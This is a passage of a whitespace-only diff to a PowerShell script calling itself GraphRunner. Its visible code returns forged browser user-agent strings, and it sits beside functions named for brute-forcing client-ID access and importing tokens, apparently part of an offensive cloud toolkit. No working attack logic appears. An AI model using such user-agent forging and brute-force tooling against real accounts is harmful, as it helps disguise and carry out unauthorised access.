                 $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
             }
@@ -7589,12 +7699,12 @@ function Invoke-ForgeUserAgent
             {
                 $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
             }
-            else 
+            else
             {
                 $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
             }
         }
-        else 
+        else
         {
             #[ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
             if ($Browser -eq 'Android')
@@ -7602,28 +7712,28 @@ function Invoke-ForgeUserAgent
                 $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
             }
             elseif($Browser -eq 'IE')
-            { 
+            {
                 $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
             }
             elseif($Browser -eq 'Chrome')
-            { 
+            {
                 $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
             }
             elseif($Browser -eq 'Firefox')
-            { 
+            {
                 $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
             }
             elseif($Browser -eq 'Safari')
             {
-                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15' 
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
             }
             else
             {
                 $UserAgent = $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
-            } 
+            }
         }
         return $UserAgent
-   }   
+   }
 }
 function Invoke-BruteClientIDAccess {
 
@@ -7654,8 +7764,8 @@ function Invoke-BruteClientIDAccess {
 	}
 	else {
 	   if ($Browser) {
-			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
-	   } 
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser
+	   }
 	   else {
 			$UserAgent = Invoke-ForgeUserAgent
 	   }
@@ -7741,7 +7851,7 @@ function Invoke-ImportTokens {
 }
 function List-GraphRunnerModules {
     <#
-    .SYNOPSIS 
+    .SYNOPSIS
     A module to list all of the GraphRunner modules
     #>
 
